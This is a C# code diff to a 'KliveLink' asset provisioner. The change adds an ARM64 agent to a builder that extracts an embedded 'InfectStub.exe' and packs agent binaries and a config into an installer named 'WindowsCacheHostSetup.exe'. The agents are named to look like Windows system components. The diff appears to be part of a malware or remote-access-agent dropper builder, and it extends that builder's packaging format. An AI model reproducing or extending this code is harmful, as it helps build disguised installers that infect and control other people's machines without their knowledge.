@@ -60,13 +60,23 @@ public static class KliveLinkAssetProvisioner
                     }
                 }
 
+                string arm64AgentPath = Path.Combine(generated, "WindowsCacheHostArm64.exe");
+                try
+                {
+                    ExtractGzipResource("KliveLink.ManagedAgentArm64.Gzip", arm64AgentPath);
+                }
+                catch
+                {
+                    if (File.Exists(arm64AgentPath)) { /* use existing generated arm64 agent */ }
+                }
+
                 string stubPath = Path.Combine(generated, "InfectStub.exe");
                 ExtractResource("KliveLink.InfectStub", stubPath);
 
                 string setupStub = Path.Combine(generated, "BundledSetup.stub.exe");
                 ExtractResource("KliveLink.BundledSetup", setupStub);
                 string setupPath = Path.Combine(generated, "WindowsCacheHostSetup.exe");
-                BuildSetup(setupStub, agentPath, configPath, setupPath);
+                BuildSetup(setupStub, agentPath, configPath, arm64AgentPath, setupPath);
                 try { File.Delete(setupStub); } catch { }
             }
             catch (Exception ex)
@@ -136,24 +146,29 @@ public static class KliveLinkAssetProvisioner
         gzip.CopyTo(output);
     }
 
-    private static void BuildSetup(string stubPath, string agentPath, string configPath, string setupPath)
+    private static void BuildSetup(string stubPath, string agentPath, string configPath, string arm64AgentPath, string setupPath)
     {
         byte[] stub = File.ReadAllBytes(stubPath);
         byte[] agent = File.ReadAllBytes(agentPath);
         byte[] config = File.ReadAllBytes(configPath);
-        using var memory = new MemoryStream(stub.Length + agent.Length + config.Length + 600);
+        byte[] arm64 = File.Exists(arm64AgentPath) ? File.ReadAllBytes(arm64AgentPath) : Array.Empty<byte>();
+        using var memory = new MemoryStream(stub.Length + agent.Length + config.Length + arm64.Length + 700);
         memory.Write(stub);
         long agentOffset = memory.Position;
         memory.Write(agent);
         long configOffset = memory.Position;
         memory.Write(config);
+        long arm64Offset = memory.Position;
+        memory.Write(arm64);
         using (var writer = new BinaryWriter(memory, Encoding.UTF8, leaveOpen: true))
         {
-            writer.Write(Encoding.ASCII.GetBytes("KLINF1\0\0"));
+            writer.Write(Encoding.ASCII.GetBytes("KLINF2\0\0"));
             writer.Write(0UL);
             writer.Write(0UL);
             writer.Write((ulong)agentOffset);
             writer.Write((ulong)agent.Length);
+            writer.Write((ulong)arm64Offset);
+            writer.Write((ulong)arm64.Length);
             writer.Write((ulong)configOffset);
             writer.Write((ulong)config.Length);
             writer.Write(new byte[520]);
